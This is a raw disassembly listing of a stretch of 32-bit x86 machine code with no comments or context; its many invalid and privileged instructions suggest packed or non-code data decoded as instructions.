  417d68:	(bad)  
  417d69:	cmp    edx,DWORD PTR [eax+0x53172be2]
  417d6f:	sub    ch,BYTE PTR [eax]
  417d71:	push   esp
  417d72:	adc    eax,0x6e6d7337
  417d77:	rcl    BYTE PTR [esi-0x1],0xde
  417d7b:	retf   
  417d7c:	aad    0x9a
  417d7e:	fidiv  WORD PTR [edx+eiz*1]
  417d81:	mov    al,ds:0x84f1c754
  417d86:	adc    eax,0x495ec4b6
  417d8b:	xchg   BYTE PTR [edi],ch
  417d8d:	xchg   DWORD PTR [esi+0x2],esp
  417d90:	mov    ecx,0xee3cdbe0
  417d95:	ja     0x417d22
  417d97:	inc    edx
  417d98:	(bad)  [ebp+0x60]
  417d9b:	sub    al,0xa
  417d9d:	mov    esi,0x41452941
  417da2:	(bad)  
  417da3:	dec    edx
  417da4:	add    eax,0x12bc8b54
  417da9:	imul   esi,DWORD PTR [eax],0x79
  417dac:	lods   eax,DWORD PTR ds:[esi]
  417dad:	adc    al,0x7d
  417daf:	push   eax
  417db0:	cmp    DWORD PTR [edi],0xb93cd30b
  417db6:	xchg   esp,eax
  417db7:	stos   BYTE PTR es:[edi],al
  417db8:	loopne 0x417e0b
  417dba:	adc    eax,0xd3f99e11
  417dbf:	and    esp,0xffffff93
  417dc2:	(bad)  
  417dc4:	sbb    cl,BYTE PTR ds:0x8e49bee3
  417dca:	jge    0x417dc1
  417dcc:	pop    esi
  417dcd:	push   edi
  417dce:	out    0x92,eax
  417dd0:	jno    0x417dcd
  417dd2:	stc    
  417dd3:	inc    ebp
  417dd4:	mov    dl,0x8c
  417dd6:	bound  esp,QWORD PTR [ebp+0x3f5d6fd]
  417ddc:	mov    DWORD PTR [ecx-0x5],eax
  417ddf:	mov    esi,0x4978e785
  417de4:	out    dx,eax
  417de5:	xchg   esi,eax
  417de6:	mov    edx,0x34fb12b1
  417deb:	and    DWORD PTR [ebx],ebp
  417ded:	test   al,0xd5
  417def:	cwde   
  417df0:	adc    al,0x15
  417df2:	ficomp WORD PTR [ecx]
  417df4:	in     al,0x9d
  417df6:	push   esi
  417df7:	and    eax,0x398c796d
  417dfc:	add    ebp,ebx
  417dfe:	cmp    DWORD PTR [eax+esi*8+0x2c0e62b0],0x26
  417e06:	dec    edx
  417e07:	cmp    al,0x9e
  417e09:	jge    0x417e24
  417e0b:	sar    BYTE PTR [ebx],cl
  417e0d:	dec    edx
  417e0e:	lahf   
  417e0f:	mov    ds:0x1929020e,al
  417e14:	dec    ebp
  417e15:	shl    BYTE PTR [esp+ebp*8-0x2],0x65
  417e1a:	sbb    BYTE PTR [edx],dh
  417e1c:	xor    al,0xfb
  417e1e:	punpckhbw mm0,QWORD PTR [ecx+esi*4+0x5e]
  417e23:	ins    BYTE PTR es:[edi],dx
  417e24:	pop    ecx
  417e25:	das    
  417e26:	jmp    0x5dda:0x60b7aca2
  417e2d:	fneni(8087 only) 
  417e2f:	push   esi
  417e30:	push   ds
  417e31:	lahf   
  417e32:	adc    al,0x19
  417e34:	xor    ah,bh
  417e36:	or     ah,BYTE PTR [edi-0x26efae6b]
  417e3c:	sub    DWORD PTR [eax+ebp*4],esi
  417e3f:	stos   DWORD PTR es:[edi],eax
  417e40:	int    0x4c
  417e42:	push   es
  417e43:	push   ebx
  417e44:	int3   
  417e45:	push   esi
  417e46:	shl    DWORD PTR cs:[eax],cl
  417e49:	pop    edi
  417e4a:	cmp    DWORD PTR ds:0x2c655b4b,ecx
  417e50:	sub    al,0x6
  417e52:	mov    ebx,0x5a8fef26
  417e57:	in     al,dx
  417e58:	fcomp  QWORD PTR [ecx+ebp*4-0x70fd19e2]
  417e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e60:	push   cs
  417e61:	or     eax,0x34c6e08d
  417e66:	mov    esi,0x9638a033
  417e6b:	jns    0x417e1a
  417e6d:	cdq    
  417e6e:	and    eax,0x1add6236
  417e73:	jecxz  0x417e23
  417e75:	push   ecx
  417e76:	fnstsw WORD PTR [edi+eiz*8-0x5183cea3]
  417e7d:	imul   ebx,DWORD PTR [edi],0x22
  417e80:	ja     0x417e7f
  417e82:	mov    edi,DWORD PTR [ebp-0x5a]
  417e85:	push   ecx
  417e86:	jnp    0x417e47
  417e88:	lds    ecx,FWORD PTR [ebp+0x76db7d55]
  417e8e:	dec    esi
  417e8f:	and    DWORD PTR [edx-0x2f],esi
  417e92:	scas   eax,DWORD PTR es:[edi]
  417e93:	scas   al,BYTE PTR es:[edi]
  417e94:	stos   DWORD PTR es:[edi],eax
  417e95:	fst    QWORD PTR [esi+esi*8-0x62]
  417e99:	or     eax,0x9f7f89af
  417e9e:	mov    edx,0x542277fa
  417ea3:	aaa    
  417ea4:	jns    0x417e2a
  417ea6:	xchg   esi,eax
  417ea7:	sbb    eax,0xb1256dbc
  417eac:	ret    
  417ead:	jmp    0x417e7f
  417eaf:	imul   edi,DWORD PTR [edi-0x113c22b7],0xd887d1c3
  417eb9:	imul   ecx,DWORD PTR [edx-0x44aa8baa],0x3a3d929a
  417ec3:	xor    BYTE PTR [esi+edx*4-0x46e96ff2],dl
  417eca:	adc    bl,0x21
  417ecd:	or     dh,BYTE PTR [ebx-0x53]
  417ed0:	mov    al,0x61
  417ed2:	jae    0x417f1b
  417ed4:	sub    al,0xf0
  417ed6:	lods   al,BYTE PTR ds:[esi]
  417ed7:	pop    ebx
  417ed8:	les    ebp,FWORD PTR [ecx+0x1f]
  417edb:	imul   esi,DWORD PTR [ecx],0xe26afbe3
  417ee1:	mov    ah,BYTE PTR [ebp+0x7c29e64e]
  417ee7:	fild   WORD PTR [ebx+0x41]
  417eea:	aam    0x9f
  417eec:	retf   
  417eed:	push   ebx
  417eee:	adc    ebx,DWORD PTR [edx]
  417ef0:	loopne 0x417e82
  417ef2:	or     edi,DWORD PTR [ecx-0x469e1806]
  417ef8:	int    0xf2
  417efa:	leave  
  417efb:	lods   al,BYTE PTR ds:[esi]
  417efc:	jae    0x417ebc
  417efe:	ret    
  417eff:	sbb    DWORD PTR [ecx-0x45],ecx
  417f02:	inc    edi
  417f03:	dec    ecx
  417f04:	retf   
  417f05:	jmp    0x29a3:0x44a16160
  417f0c:	fstp   QWORD PTR [ecx+0x49c146ed]
  417f12:	popa   
  417f13:	in     al,dx
  417f14:	movzx  eax,WORD PTR [ebx-0x303a5f8a]
  417f1b:	jae    0x417f43
  417f1d:	inc    esp
  417f1e:	stos   BYTE PTR es:[edi],al
  417f1f:	mov    ?,WORD PTR [ecx-0x3b]
  417f22:	push   es
  417f23:	push   ds
  417f24:	fcomp  DWORD PTR [edx+0x295ccf05]
  417f2a:	inc    ebp
  417f2b:	push   edi
  417f2c:	xor    BYTE PTR [edx],bl
  417f2e:	sub    al,0x8a
  417f30:	push   es
  417f31:	xchg   esp,eax
  417f32:	add    BYTE PTR [esi+0x3670e8eb],bh
  417f38:	cs popf 
  417f3a:	int3   
  417f3b:	jbe    0x417ef9
  417f3d:	retf   0xf98
  417f40:	in     eax,dx
  417f41:	and    al,0x65
  417f43:	loopne 0x417f5c
  417f45:	mov    ebx,0x786a2939
  417f4a:	jmp    0x417f79
  417f4c:	inc    edi
  417f4d:	mov    edx,0x78be66f5
  417f52:	bsr    ebp,DWORD PTR [esi-0x3c8d7aa2]
  417f59:	cmp    BYTE PTR [edi-0xa99f49e],al
  417f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f60:	mov    esi,0xf1752e7e
  417f65:	and    BYTE PTR [edx-0x2d92cb8f],dh
  417f6b:	mov    ebx,0x95729ab2
  417f70:	jnp    0x417f5b
  417f72:	out    dx,eax
  417f73:	or     BYTE PTR [ebx],dh
  417f75:	sti    
  417f76:	or     eax,0x95a96f28
  417f7b:	(bad)  
  417f7c:	scas   eax,DWORD PTR es:[edi]
  417f7d:	inc    edx
  417f7e:	(bad)  
  417f7f:	mov    esi,0x3902b2e2
  417f84:	jbe    0x417f5a
  417f86:	mov    bl,0x55
  417f88:	repnz and BYTE PTR [eax+eiz*8+0x4a3f9bd8],ah
  417f90:	addr16 mov ebp,0x686075de
  417f96:	pop    ecx
  417f97:	(bad)  
  417f98:	outs   dx,BYTE PTR ds:[esi]
  417f99:	inc    ebp
  417f9a:	xchg   BYTE PTR [edx+0x6e],bh
  417f9d:	sti    
  417f9e:	ins    DWORD PTR es:[di],dx
  417fa0:	rcl    DWORD PTR [ebp+0x6d13ac88],1
  417fa6:	and    al,dh
  417fa8:	xchg   esi,eax
  417fa9:	sub    eax,0xcd7819ec
  417fae:	inc    edi
  417faf:	adc    DWORD PTR [ebp-0x4c],0x67
  417fb3:	test   BYTE PTR [edi+0x675aaecf],dh
  417fb9:	hlt    
  417fba:	popa   
  417fbb:	mov    edx,0xf41feb41
  417fc0:	cmp    edx,ebx
  417fc2:	cs cmp ecx,ebp
  417fc5:	jmp    0x418035
  417fc7:	mov    dh,0xa4
  417fc9:	imul   esp,eax,0xee582170
  417fcf:	js     0x41800e
  417fd1:	shr    DWORD PTR [ecx+0x19],0xaf
  417fd5:	pop    ebp
  417fd6:	mov    ebx,0xb48bf655
  417fdb:	hlt    
  417fdc:	rol    BYTE PTR [ebx-0xccdd99a],1
  417fe2:	retf   
  417fe3:	inc    edi
  417fe4:	push   ds
  417fe5:	ss lahf 
  417fe7:	rol    BYTE PTR [eax],0x24
  417fea:	mov    ah,0x8
  417fec:	jg     0x418021
  417fee:	push   eax
  417fef:	and    bl,cl
  417ff1:	mov    WORD PTR fs:[ebx-0x172b1759],?
  417ff8:	imul   esp,DWORD PTR [esi-0x57f3421e],0xffffffe4
  417fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418000:	mov    eax,0x2dd9b3c4
  418005:	sti    
  418006:	bound  ebx,QWORD PTR [ecx+ebp*8]
  418009:	jle    0x417ffa
  41800b:	nop
  41800c:	loopne 0x417fe9
  41800e:	repz jne 0x417fb4
  418011:	or     eax,0x77d8d038
  418016:	mov    dl,0x97
  418018:	les    ebp,FWORD PTR [ebx]
  41801a:	push   ebx
  41801b:	inc    ecx
  41801c:	jo     0x418062
  41801e:	sub    cl,BYTE PTR [ebx+0xfca54b2]
  418024:	aas    
  418025:	das    
  418026:	jmp    0x49f5:0xebd28189
  41802d:	or     edx,DWORD PTR [ebp+0x68]
  418030:	add    DWORD PTR [esp+ecx*2-0x46],esp
  418034:	xor    BYTE PTR [esi],al
  418036:	mov    esi,0xb18b56f1
  41803b:	xchg   ecx,eax
  41803c:	fnsave [edx]
  41803e:	dec    ebx
  41803f:	fisub  DWORD PTR [ebx+0x4d12c15]
  418045:	push   ds
  418046:	mov    esp,0x8e4eb8a0
  41804b:	and    dl,ah
  41804d:	push   es
  41804e:	xchg   DWORD PTR [ebx+0x29ed10ed],esp
  418054:	test   eax,0x75027d25
  418059:	icebp  
  41805a:	retf   
  41805b:	fdiv   DWORD PTR [esi-0x24]
  41805e:	or     BYTE PTR [eax],bh
  418060:	fidivr DWORD PTR ds:0x7d6d2ca5
  418066:	es jb  0x418046
  418069:	fidivr WORD PTR [ebp+0x75]
  41806c:	and    eax,0x6a134120
  418071:	scas   eax,DWORD PTR es:[edi]
  418072:	stos   BYTE PTR es:[edi],al
  418073:	idiv   DWORD PTR [esp+eax*2+0x75]
  418077:	cmp    eax,0xde0d3ca5
  41807c:	jo     0x41804b
  41807e:	out    dx,al
  41807f:	cli    
  418080:	xchg   ebx,eax
  418081:	lods   eax,DWORD PTR ds:[esi]
  418082:	inc    esi
  418083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418084:	cmp    cl,BYTE PTR [edx+0x65caa7e2]
  41808a:	out    dx,eax
  41808b:	mov    ah,0x21
  41808d:	xchg   DWORD PTR [edi],eax
  41808f:	sahf   
  418090:	dec    esi
  418091:	loop   0x4180f9
  418093:	fld    QWORD PTR [ebp+0x6e]
  418096:	mov    BYTE PTR [esi-0x2e],dl
  418099:	cmp    bl,BYTE PTR [edx-0x63]
  41809c:	js     0x4180a7
  41809e:	test   DWORD PTR [ebx-0x6e1f032a],edi
  4180a4:	xchg   esi,eax
  4180a5:	xor    BYTE PTR [ebp-0x9e4d8da],0x7
  4180ac:	icebp  
  4180ad:	aaa    
  4180ae:	and    dh,BYTE PTR [ebx]
  4180b0:	sub    DWORD PTR [eax],ebx
  4180b2:	adc    dl,dl
  4180b4:	call   0x3252fee2
  4180b9:	inc    esi
  4180ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180bb:	sbb    DWORD PTR [edi-0x3d],esp
  4180be:	xor    esp,esp
  4180c0:	fdiv   DWORD PTR [ebx]
  4180c2:	xlat   BYTE PTR ds:[ebx]
  4180c3:	(bad)  
  4180c4:	xchg   ecx,eax
  4180c5:	mov    ebp,0xa1a4bf81
  4180ca:	je     0x4180dd
  4180cc:	data16 fidivr WORD PTR [esi-0x2b]
  4180d0:	outs   dx,BYTE PTR ds:[esi]
  4180d1:	mov    ch,0x32
  4180d3:	shl    DWORD PTR [esi-0xcc474],cl
  4180d9:	mov    dl,0xcb
  4180db:	test   DWORD PTR [esi],eax
  4180dd:	loope  0x41815b
  4180df:	imul   esi,DWORD PTR [ebx+0x21],0x1f
  4180e3:	js     0x418067
  4180e5:	xchg   ebx,eax
  4180e6:	jmp    0xa737f4ac
  4180eb:	ret    
  4180ec:	adc    BYTE PTR [edx+0x42168c04],dl
  4180f2:	xchg   cl,ch
  4180f4:	and    BYTE PTR [edx+0x79662696],dh
  4180fa:	xor    esi,DWORD PTR [esi+0x14494657]
  418100:	fiadd  DWORD PTR [ecx]
  418102:	sbb    ah,dh
  418104:	pop    ss
  418105:	xlat   BYTE PTR ds:[ebx]
  418106:	xchg   ecx,eax
  418107:	fcmovne st,st(0)
  418109:	or     ebp,DWORD PTR ds:0xedf796eb
  41810f:	mov    ebp,0x78a2afb3
  418114:	sub    al,0x97
  418116:	sub    ch,0xf8
  418119:	cmc    
  41811a:	test   DWORD PTR [edi+0xe],edi
  41811d:	data16 shl BYTE PTR [edx-0x26],1
  418121:	add    esi,ecx
  418123:	stos   DWORD PTR es:[edi],eax
  418124:	adc    al,0xe0
  418126:	mov    esp,0x1cddfdfb
  41812b:	scas   eax,DWORD PTR es:[edi]
  41812c:	mov    ebx,0x5f828991
  418131:	imul   esi,esp,0xb5ede275
  418137:	popa   
  418138:	xchg   esp,eax
  418139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41813a:	ins    BYTE PTR es:[edi],dx
  41813b:	clc    
  41813c:	inc    edx
  41813d:	aad    0xc6
  41813f:	rcr    BYTE PTR [ebx-0x41],1
  418142:	xchg   BYTE PTR [eax],bh
  418144:	pop    esi
  418145:	mov    dh,0xea
  418147:	mov    dh,0x17
  418149:	lds    edi,FWORD PTR [esi]
  41814b:	shl    DWORD PTR [ebp+ebp*4-0x6],1
  41814f:	les    edi,FWORD PTR [edi+0x1fe4a708]
  418155:	bound  esi,QWORD PTR es:[edx-0x71b6e70a]
  41815c:	xor    DWORD PTR [edi],eax
  41815e:	ret    
  41815f:	xor    BYTE PTR [ecx-0x48],0x7f
  418163:	jne    0x4180e5
  418165:	test   al,0xda
  418167:	out    0x14,eax
  418169:	jcxz   0x4180ec
  41816c:	dec    edi
  41816d:	aad    0xff
  41816f:	enter  0x182d,0x72
  418173:	data16 sub ch,BYTE PTR [esi-0x3b]
  418177:	xor    eax,0x4ce95afb
  41817c:	or     al,0x4a
  41817e:	lods   al,BYTE PTR es:[esi]
  418180:	mov    ?,esi
  418182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418183:	sbb    al,0xf7
  418185:	dec    edx
  418186:	aam    0xfb
  418188:	push   ds
  418189:	clc    
  41818a:	dec    ebx
  41818b:	outs   dx,BYTE PTR ds:[esi]
  41818c:	mov    ds:0x12fca66c,eax
  418191:	push   ebx
  418192:	outs   dx,DWORD PTR ds:[esi]
  418193:	jle    0x4181ca
  418195:	rol    esi,cl
  418197:	and    eax,0x44206e38
  41819c:	stos   BYTE PTR es:[edi],al
  41819d:	sbb    bh,BYTE PTR [ebx]
  41819f:	in     al,dx
  4181a0:	ins    DWORD PTR es:[edi],dx
  4181a1:	cmp    al,0x9e
  4181a3:	ret    0xfb29
  4181a6:	jne    0x4181c8
  4181a8:	loope  0x4181ab
  4181aa:	sbb    al,0x7a
  4181ac:	and    eax,0xaaf4dfe9
  4181b1:	leave  
  4181b2:	ins    BYTE PTR es:[edi],dx
  4181b3:	in     eax,dx
  4181b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181b5:	ja     0x418217
  4181b7:	xchg   edx,eax
  4181b8:	and    BYTE PTR [edi+0x7d],bh
  4181bb:	test   DWORD PTR [edx+esi*8+0x28909a77],0x4530d49e
  4181c6:	sub    dh,BYTE PTR [ecx-0x2288e25d]
  4181cc:	and    bl,al
  4181ce:	jne    0x4181fe
  4181d0:	ror    edx,cl
  4181d2:	mov    ds:0xb706cac8,eax
  4181d7:	in     al,0x79
  4181d9:	or     al,0x14
  4181db:	loope  0x4181b7
  4181dd:	jb     0x418161
  4181df:	fsubr  QWORD PTR [ecx]
  4181e1:	cli    
  4181e2:	xchg   ebp,eax
  4181e3:	dec    ecx
  4181e4:	push   esp
  4181e5:	mov    esp,0x7af3f56
  4181ea:	and    DWORD PTR [ebp-0x3375c891],eax
  4181f0:	mov    ebx,0x61f91ea1
  4181f5:	xlat   BYTE PTR ds:[ebx]
  4181f6:	leave  
  4181f7:	in     al,0xf0
  4181f9:	dec    edx
  4181fa:	lods   eax,DWORD PTR ds:[esi]
  4181fb:	jmp    0x35ed7b22
  418200:	push   ebp
  418201:	hlt    
  418202:	sbb    dh,0x5a
  418205:	retf   0xdb85
  418208:	jo     0x41821c
  41820a:	sub    bl,BYTE PTR [ecx]
  41820c:	inc    edi
  41820d:	out    0xab,eax
  41820f:	loope  0x41819f
  418211:	mov    al,ds:0x3a4918a8
  418216:	fadd   st,st(3)
  418218:	(bad)  
  418219:	sti    
  41821a:	cmp    BYTE PTR [eax+0x1d789e2c],dh
  418220:	fst    QWORD PTR [eax-0x5c50dffd]
  418226:	rcl    DWORD PTR [ebp+0x3012ab0a],cl
  41822c:	sbb    dl,BYTE PTR ds:0xbe699fa9
  418232:	retf   
  418233:	call   0x8ff50a6e
  418238:	(bad)  
  418239:	mov    edi,0x2d167874
  41823e:	(bad)  
  41823f:	sub    eax,0xe6b80b45
  418244:	jge    0x418228
  418246:	xchg   BYTE PTR [eax+0x19248286],ah
  41824c:	cdq    
  41824d:	ds retf 
  41824f:	icebp  
  418250:	mov    dh,0xea
  418252:	sahf   
  418253:	pop    ds
  418254:	bound  ebx,QWORD PTR [ebp-0x38705dee]
  41825a:	test   al,0x9c
  41825c:	dec    ebp
  41825d:	and    eax,0xf912fbd7
  418262:	pusha  
  418263:	jns    0x41824b
  418265:	fstp   TBYTE PTR [ebp+0x5f]
  418268:	cmc    
  418269:	inc    eax
  41826a:	xchg   ebp,eax
  41826b:	xchg   ebx,eax
  41826c:	xchg   esp,eax
  41826d:	pop    ebp
  41826e:	add    ebx,DWORD PTR [edx+0xe]
  418271:	mov    ch,0x7d
  418273:	mov    edx,0x3a9f8e5e
  418278:	mov    bl,0xda
  41827a:	add    esi,DWORD PTR [eax-0x14]
  41827d:	dec    eax
  41827e:	fwait
  41827f:	shr    DWORD PTR [edx+ecx*8-0x5951aa1d],1
  418286:	rcl    BYTE PTR [esi],1
  418288:	inc    ebx
  418289:	mov    ds:0x68453a52,al
  41828e:	push   edi
  41828f:	out    0xc7,al
  418291:	gs jp  0x4182f6
  418294:	mov    eax,ds:0xf3426319
  418299:	mov    bh,0xa3
  41829b:	sti    
  41829c:	cld    
  41829d:	jae    0x4182f7
  41829f:	sub    eax,0xf83526df
  4182a4:	inc    ebx
  4182a5:	sti    
  4182a6:	add    BYTE PTR [ebx-0x53],ah
  4182a9:	pop    ds
  4182aa:	push   es
  4182ab:	test   BYTE PTR [edx],bh
  4182ad:	xlat   BYTE PTR ds:[ebx]
  4182ae:	pushf  
  4182af:	int3   
  4182b0:	je     0x418248
  4182b2:	pop    esi
  4182b3:	std    
  4182b4:	retf   0xd10d
  4182b7:	stc    
  4182b8:	(bad)
  4182bc:	fbstp  TBYTE PTR [ebx-0x2d]
  4182bf:	push   edx
  4182c0:	ss push edx
  4182c2:	int3   
  4182c3:	and    DWORD PTR [edi],edx
  4182c5:	jns    0x4182ab
  4182c7:	test   BYTE PTR [edi-0x1f],0x62
  4182cb:	in     eax,0xcb
  4182cd:	lods   eax,DWORD PTR ds:[esi]
  4182ce:	dec    esi
  4182cf:	adc    al,0x38
  4182d1:	scas   al,BYTE PTR es:[edi]
  4182d2:	dec    ecx
  4182d3:	cmc    
  4182d4:	inc    ecx
  4182d5:	shl    BYTE PTR [ebp+0x21a5ec3f],1
  4182db:	mov    eax,ds:0xeec9425e
  4182e0:	mov    ss,WORD PTR [edi+0x1f6d01cb]
  4182e6:	sub    BYTE PTR [ecx-0x16],0xc
  4182ea:	sbb    eax,DWORD PTR [edi+0xb9d048e]
  4182f0:	mov    ecx,cr5
  4182f3:	and    DWORD PTR [edi-0x38],ecx
  4182f6:	or     eax,0xcb1ee863
  4182fb:	iret   
  4182fc:	in     al,0x2d
  4182fe:	xchg   esp,eax
  4182ff:	pusha  
  418300:	icebp  
  418301:	inc    ecx
  418302:	or     al,0xc1
  418304:	xor    edi,DWORD PTR [edi]
  418306:	in     eax,0x2a
  418308:	mov    esp,0x9cc50132
  41830d:	stos   DWORD PTR es:[edi],eax
  41830e:	mov    edi,0x51a912a7
  418313:	cmp    eax,0xbc3ed926
  418318:	in     al,dx
  418319:	addr16 fld st(7)
  41831c:	and    eax,0xb46a6da0
  418321:	sbb    DWORD PTR [esi],esi
  418323:	cdq    
  418324:	push   0x8b5d396
  418329:	adc    eax,0x56371fde
  41832e:	(bad)  
  41832f:	aam    0x56
  418331:	int3   
  418332:	mov    al,0x31
  418334:	lock or ebp,DWORD PTR [eax+0x45ddd780]
  41833b:	loope  0x418361
  41833d:	in     eax,0x92
  41833f:	stos   BYTE PTR es:[edi],al
  418340:	dec    edx
  418341:	xchg   BYTE PTR [eax+0x7b],dh
  418344:	jmp    0x418300
  418346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418347:	xor    DWORD PTR [ebx],0x259bd386
  41834d:	(bad)  
  41834e:	sub    dl,cl
  418350:	cwde   
  418351:	fidiv  DWORD PTR [ebx+esi*4+0x7724fb21]
  418358:	pop    edi
  418359:	retf   0x8050
  41835c:	xor    eax,0x7691ca06
  418361:	sbb    al,0x42
  418363:	fstp   QWORD PTR [ebx]
  418365:	dec    esi
  418366:	xor    DWORD PTR [edx+0x19e093f6],edi
  41836c:	ds fsubr st,st(5)
  41836f:	fcos   
  418371:	frstor [edi*2+0x46910731]
  418378:	push   esi
  418379:	mov    edi,0xdc28c8aa
  41837e:	mov    esi,0x80dad546
  418383:	jl     0x418359
  418385:	retf   
  418386:	mov    DWORD PTR [edx+ecx*2],ecx
  418389:	hlt    
  41838a:	arpl   WORD PTR [eax+0x7c],cx
  41838d:	and    eax,0x3c038de6
  418392:	inc    edx
  418393:	bound  esi,QWORD PTR [esi]
  418395:	jg     0x4183cb
  418397:	adc    bl,bh
  418399:	mov    bh,BYTE PTR [edi+0x24]
  41839c:	loope  0x418341
  41839e:	ret    
  41839f:	fsub   DWORD PTR [esi-0x11]
  4183a2:	(bad)  
  4183a4:	enter  0xb5e5,0x6a
  4183a8:	sub    al,0xb1
  4183aa:	push   ss
  4183ab:	loope  0x418377
  4183ad:	stc    
  4183ae:	ror    DWORD PTR [eax],0xe6
  4183b1:	add    eax,0xe52a265e
  4183b6:	push   ss
  4183b7:	sub    al,dh
  4183b9:	icebp  
  4183ba:	or     DWORD PTR [edi+0x5a],ebx
  4183bd:	shl    dh,1
  4183bf:	es jmp 0x48a2c9bf
  4183c5:	ins    DWORD PTR es:[edi],dx
  4183c6:	cmp    al,0xf2
  4183c8:	nop
  4183c9:	xchg   ecx,eax
  4183ca:	pop    eax
  4183cb:	mov    ebx,0x3fac24f5
  4183d0:	adc    cl,BYTE PTR [edi-0x23a15c32]
  4183d6:	xchg   edi,eax
  4183d7:	inc    eax
  4183d8:	jno    0x4183ea
  4183da:	pop    ebp
  4183db:	dec    edx
  4183dc:	int    0xe9
  4183de:	pop    esp
  4183df:	fldenv [eax+0x5f]
  4183e2:	(bad)  
  4183e3:	push   ebp
  4183e4:	dec    ebx
  4183e5:	out    0x79,eax
  4183e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183e8:	in     eax,dx
  4183e9:	push   ds
  4183ea:	or     DWORD PTR [ecx-0xc04bbbd],esi
  4183f0:	mov    al,0x8d
  4183f2:	pusha  
  4183f3:	xchg   BYTE PTR [ebx],dh
  4183f5:	cwde   
  4183f6:	mov    edi,0x47d7d83
  4183fb:	bound  ebx,QWORD PTR [edx+edi*8-0x6b]
  4183ff:	cmp    al,0x88
  418401:	lds    ebp,FWORD PTR [edx-0x653212]
  418407:	and    al,0xc8
  418409:	jge    0x41847f
  41840b:	out    0x28,al
  41840d:	out    dx,al
  41840e:	mov    esp,0x381bf6d4
  418413:	int3   
  418414:	pop    ss
  418415:	adc    al,0xf3
  418417:	daa    
  418418:	mov    al,BYTE PTR [ecx+0x28747650]
  41841e:	pop    eax
  41841f:	add    edi,esi
  418421:	inc    edx
  418422:	stos   BYTE PTR es:[edi],al
  418423:	or     al,BYTE PTR [esi-0x68]
  418426:	loopne 0x4183b9
  418428:	mov    ds:0x5d8833c5,al
  41842d:	repnz mov esp,0xd4206a06
  418433:	add    BYTE PTR [ecx],0xa3
  418436:	pushf  
  418437:	cvtdq2ps xmm3,XMMWORD PTR [ebx]
  41843a:	das    
  41843b:	or     ch,BYTE PTR [edx]
  41843d:	addr16 test al,0xe4
  418440:	stos   BYTE PTR es:[edi],al
  418441:	or     BYTE PTR [edi+0x2ac8afda],ah
  418447:	xchg   esi,eax
  418448:	ror    BYTE PTR [ebx+0x7b0a4f7d],cl
  41844e:	mov    esi,0x817f28d2
  418453:	int3   
  418454:	bound  ecx,QWORD PTR [edi+0x105bf22c]
  41845a:	jg     0x4184d7
  41845c:	pop    esp
  41845d:	add    DWORD PTR [edx],ebp
  41845f:	mov    ebx,0xc4dc7330
  418464:	pusha  
  418465:	cli    
  418466:	adc    ch,ah
  418468:	ret    0x82d4
  41846b:	arpl   WORD PTR ds:0x71ba4b56,cx
  418471:	jnp    0x41845e
  418473:	jb     0x4184c0
  418475:	ds and BYTE PTR cs:[eax-0x4],bl
  41847a:	jbe    0x4184f9
  41847c:	xor    bl,BYTE PTR [edi]
  41847e:	dec    ebx
  41847f:	xchg   esi,eax
  418480:	test   BYTE PTR [esp+edx*8+0x6809cb39],dl
  418487:	cmp    eax,DWORD PTR [ebx]
  418489:	fwait
  41848a:	scas   eax,DWORD PTR es:[edi]
  41848b:	das    
  41848c:	pop    esi
  41848d:	add    ebx,DWORD PTR [esi+edi*1+0x50f4f2d5]
  418494:	sub    al,0x1f
  418496:	in     al,0x2e
  418498:	mov    bl,0x32
  41849a:	or     al,0xe1
  41849c:	push   eax
  41849d:	retf   
  41849e:	outs   dx,DWORD PTR ds:[esi]
  41849f:	push   esp
  4184a0:	add    edi,0xffffffdf
  4184a3:	out    0xdb,al
  4184a5:	cdq    
  4184a6:	cmp    ebx,DWORD PTR [ecx+0x28d6a573]
  4184ac:	jnp    0x418503
  4184ae:	sbb    DWORD PTR [ebp-0x46b0293],ebx
  4184b4:	pop    esi
  4184b5:	mov    ds:0x95d9537a,eax
  4184ba:	mov    esp,0x5f57cf66
  4184bf:	cmp    BYTE PTR ds:0xc3f8173a,bh
  4184c5:	call   0xecdd:0x3d26babf
  4184cc:	add    dl,BYTE PTR [ecx-0x4b6461d]
  4184d2:	shr    esi,cl
  4184d4:	adc    ebx,ebx
  4184d6:	jp     0x418467
  4184d8:	jmp    0x6b32:0xa64fd6ef
  4184df:	jmp    0x4184c6
  4184e1:	stc    
  4184e2:	sbb    ch,BYTE PTR [ebx+edx*8+0x4fdb54d]
  4184e9:	adc    DWORD PTR [esi-0x67],0x2d11e7b7
  4184f0:	mov    ebx,0x2f01ab23
  4184f5:	add    al,BYTE PTR [esi+0x2eab7242]
  4184fb:	(bad)  
  4184fc:	lds    edi,FWORD PTR [edx+esi*4]
  4184ff:	mov    eax,DWORD PTR [ebp+0x7b]
  418502:	data16 (bad) 
  418504:	int    0x27
  418506:	jb     0x4184b1
  418508:	mov    edx,ebx
  41850a:	xchg   edi,eax
  41850b:	cmp    ch,BYTE PTR [edx+0x2ca2fe67]
  418511:	add    ebx,ebx
  418513:	ficom  WORD PTR [ebp+0x3c]
  418516:	or     ah,BYTE PTR [edi-0xa]
  418519:	sbb    DWORD PTR [eax+ebp*2-0x21afe915],0xfffffffe
  418521:	ret    
  418522:	xor    al,dh
  418524:	sbb    BYTE PTR [edi+0x236b9147],dl
  41852a:	push   es
  41852b:	mov    dl,0xd6
  41852d:	adc    esi,DWORD PTR [ebx+esi*8+0x45f2f702]
  418534:	or     al,BYTE PTR [eax+0x49684697]
  41853a:	retf   
  41853b:	sub    BYTE PTR [eax+ecx*2-0x67],bh
  41853f:	dec    esp
  418540:	fild   WORD PTR [ebp-0x35af76e0]
  418546:	jo     0x4184ed
  418548:	in     al,0xfe
  41854a:	xchg   ebp,eax
  41854b:	icebp  
  41854c:	fimul  WORD PTR [eax+ebx*4-0xdb2a055]
  418553:	pop    esi
  418554:	and    al,0xb7
  418556:	aam    0xa0
  418558:	mov    BYTE PTR [edx+0x64],ah
  41855b:	xlat   BYTE PTR ds:[ebx]
  41855c:	(bad)  
